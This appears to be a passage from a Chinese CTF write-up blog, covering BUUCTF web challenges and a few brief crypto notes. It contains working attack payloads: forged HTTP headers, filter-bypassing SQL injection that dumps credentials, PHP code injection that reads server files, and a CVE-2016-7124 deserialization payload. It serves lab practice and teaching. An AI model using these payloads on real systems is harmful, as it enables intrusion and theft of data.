&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/Secret.php&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;node3.buuoj.cn:29399&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;&#34;Syclover&#34; browser         #伪造客户端浏览器&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip, deflate&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;close&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Referer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;https://www.Sycsecret.com     #伪造&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;X-Forwarded-for&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;127.0.0.1             #伪造源地址&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Cache-Control&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;max-age=0&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;14buyctfbabysql2019&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#14buyctfbabysql2019&#34;&gt;#&lt;/a&gt; 14.BUYCTF[BabySql2019]&lt;/h3&gt;
&lt;p&gt;查询源代码，是 get 请求。&lt;/p&gt;
&lt;p&gt;尝试登录，在输入 &lt;code&gt;1&#39;&lt;/code&gt;  时&lt;strong&gt;报错&lt;/strong&gt;，得知是&lt;strong&gt;单引号闭合&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;选择通过密码进行注入&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;输入  &lt;code&gt;1&#39; or 1=1 -- &#39;&lt;/code&gt;  报错，发现报错语句中没有 &lt;code&gt;or&lt;/code&gt; ，应该是&lt;strong&gt;过滤&lt;/strong&gt;了。&lt;/p&gt;
&lt;p&gt;尝试:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 双写`oror`
2. 隐写`oorr`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现 2 是可行的，1 会报错，没有 &lt;code&gt;or&lt;/code&gt;  出现。这里明白是一个 &#39; 强&#39; 过滤。(&lt;strong&gt;即只要有 &lt;code&gt;or&lt;/code&gt;  字节出现在语法中就会过滤&lt;/strong&gt;，如 &lt;code&gt;inform,password&lt;/code&gt; )&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;1&#39; oorr 1=1 -- &#39;&lt;/code&gt;  成功登入，发现有&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/babysql.jpg&#34; alt=&#34;babysql&#34; /&gt;&lt;/p&gt;
&lt;p&gt;之后用 &lt;code&gt;union select&lt;/code&gt;  通过报错，发现&lt;strong&gt; union，select 都被过滤&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;uniunionon selselectect 1,1,1&lt;/code&gt;  查出列名，和对应显示。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;palyload&lt;/strong&gt;&lt;/em&gt; 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,database(),3 -- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// geek&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,(selselectect group_concat(table_name)frfromom infoorrmation_schema.tables whewherere table_schema=&#39;&lt;/span&gt;geek&lt;span class=&#34;token string&#34;&gt;&#39;),3 -- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// b4bsql&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whewherere table_schema=&#39;&lt;/span&gt;geek&lt;span class=&#34;token string&#34;&gt;&#39; anandd table_name=&#39;&lt;/span&gt;b4bsql&lt;span class=&#34;token string&#34;&gt;&#39;),3 -- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// id username password&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,2,(selselectect group_concat(concat(id,&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;,username,&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;,passwoorrd))frfromom geek.b4bsql) -- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 8 flag flag&amp;#123;11939082-38b7-412d-830a-cbe89b508804&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;/* 123&#39;  uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39; anandd table_schema=&#39;geek&#39;),(selselectect group_concat(concat(username,&#39; &#39;,passwoorrd,&#39; &#39;,id)) frfromom geek.b4bsql) -- &#39; */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
&lt;p&gt;这里发现一个&lt;strong&gt;问题&lt;/strong&gt;，使用&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; uniunionon selselectect 1,2,(selselectect concat(id,&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;,username,&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;,passwoorrd)frfromom geek.b4bsql) -- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&amp;lt;u&amp;gt; 报错 &#39; more than one row &#39; 但使用 group_concat 无报错。&amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;u&amp;gt;concat () 返回将相应字段连接成字符串的一列值。&amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;u&amp;gt;group_concat () 返回的是一串字符串。&amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;15roarctf-2019easy-calc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#15roarctf-2019easy-calc&#34;&gt;#&lt;/a&gt; 15.[RoarCTF 2019]Easy Calc&lt;/h3&gt;
&lt;p&gt;计算器。显然不是数据库。不用 SQL 注入。&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;1+1 / 1 /&#39; / 1&#39; / &amp;quot; &lt;/code&gt; 根据报错情况，没啥用。看源码。找到 calc.php.&lt;/p&gt;
&lt;p&gt;可以传参 num, 传一下试试。有 waf,php 和 waf 的变量判断方式不一样.&lt;/p&gt;
&lt;p&gt;用 php 代码注入.&lt;/p&gt;
&lt;p&gt;所以传 &lt;code&gt;?%20?num=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;传入并执行了，根据它的过滤规则，堆叠注入.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?%20num=1;var_dump(scandir(chr(47)))&lt;/code&gt; (chr (47) 是 &#39;/&#39;) 访问根目录，并打印.&lt;/p&gt;
&lt;p&gt;找到 flagg.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?&amp;amp;20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;16极客大挑战-2019php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#16极客大挑战-2019php&#34;&gt;#&lt;/a&gt; 16.[极客大挑战 2019] PHP&lt;/h3&gt;
&lt;p&gt;进入题目根据提示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对网站备份扫描 *&amp;quot;&amp;quot;E:\burpsuite\ 备份扫描.py&amp;quot;&amp;quot;* 使用 Python 脚本.&lt;/p&gt;
&lt;p&gt;得到 www.zip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/1_16_01.png&#34; alt=&#34;01&#34; /&gt;&lt;/p&gt;
&lt;p&gt;查看三个 PHP 文件.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/1_16_02.jpg&#34; alt=&#34;02&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main//1_16_03.jpg&#34; alt=&#34;03&#34; /&gt;&lt;/p&gt;
&lt;p&gt;跟据代码，思路大致为&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;利用 get 方法传参 select，select 要序列化。&lt;/p&gt;
&lt;p&gt;select 的内容是建立一个对象 Name，username=admin，password=100.&lt;/p&gt;
&lt;p&gt;要绕过 wakeup () . //&lt;em&gt; 调用 unserialize () 时会自动调用魔法函数 wakeup ()&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;构造语法 (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9ydW5jb2RlL3BocC8=&#34;&gt;PHP 执行&lt;/span&gt;)&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Name&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;yesyesyes&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;nonono&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token this keyword&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token this keyword&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;admin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 输出序列化&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// O:4:&#34;Name&#34;:2:&amp;#123;s:14:&#34;Nameusername&#34;;s:5:&#34;admin&#34;;s:14:&#34;Namepassword&#34;;i:100;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;URL 不能识别 &lt;code&gt;&amp;quot;&lt;/code&gt; ，同时， &lt;code&gt;&amp;quot;Nameusername&amp;quot;&lt;/code&gt;  应为 &lt;code&gt;&amp;quot;%00Name%00username&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;因为成员（属性）是 private，所以要在类名和成员名前加 &lt;code&gt;%00&lt;/code&gt;  这个 url 编码是空的意思&lt;/p&gt;
&lt;p&gt;序列化时生成的序列化字符串中类名前后本来就会有 0×00 也就是空&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;再利用 CVE-2016-7124 反序列化漏洞，属性数大于属性个数时，会跳过__wakeup () 魔术函数。&lt;/p&gt;
&lt;p&gt;最终 payload 为&lt;/p&gt;
&lt;figure class=&#34;highlight url&#34;&gt;&lt;figcaption data-lang=&#34;url&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token path&#34;&gt;&lt;span class=&#34;token path-separator&#34;&gt;/&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token query&#34;&gt;&lt;span class=&#34;token query-delimiter&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token pair&#34;&gt;&lt;span class=&#34;token key&#34;&gt;select&lt;/span&gt;=&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token path&#34;&gt;O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;解释一下这里利用了 &lt;code&gt;echo urlencode($b)&lt;/code&gt;  直接将其 URLencode，再将属性数改大。&lt;/p&gt;
&lt;h3 id=&#34;17buyflag&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#17buyflag&#34;&gt;#&lt;/a&gt; 17.BUYFlag&lt;/h3&gt;
&lt;p&gt;查看 pay.php 的源码&lt;/p&gt;
&lt;p&gt;发现是 post，抓包构造 payload。&lt;/p&gt;
&lt;p&gt;修改 cookie，user=1 (猜测)&lt;/p&gt;
&lt;p&gt;money=1000000000&amp;amp;password=404a (PHP 的弱等于)&lt;/p&gt;
&lt;p&gt;回显数字太长，用科学计数法 1e9.&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;h2 id=&#34;二-crypto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-crypto&#34;&gt;#&lt;/a&gt; 二、CRYPTO&lt;/h2&gt;
&lt;p&gt;摩丝密码的英文只有大写&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;摩斯电码只有大写，将它改成大写就行啦&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;1.URL&lt;/p&gt;
&lt;p&gt;2.base-16，base-32，base-64&lt;/p&gt;
&lt;p&gt;3.md5&lt;/p&gt;
&lt;p&gt;4.ROT13 旋转加密&lt;/p&gt;
&lt;h3 id=&#34;1password&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1password&#34;&gt;#&lt;/a&gt; 1.PASSWORD&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220930164451487.png&#34; alt=&#34;image-20220930164451487&#34; /&gt;&lt;/p&gt;
&lt;p&gt;就是猜。。。&lt;/p&gt;
&lt;p zs19900315=&#34;&#34;&gt;flag&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;私钥 d 攻击&lt;/p&gt;
&lt;p&gt;Coppersmith 相关攻击&lt;/p&gt;
&lt;p&gt;ECC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;2变异凯撒&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2变异凯撒&#34;&gt;#&lt;/a&gt; 2. 变异凯撒&lt;/h3&gt;
&lt;p Caesar_variation=&#34;&#34;&gt;flag&lt;/p&gt;
&lt;p&gt;&lt;em&gt;凯撒加密，即将原私钥通过 ASCII 移位的方式加密。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;得到密文。可能每处移位的不一样。&lt;/p&gt;
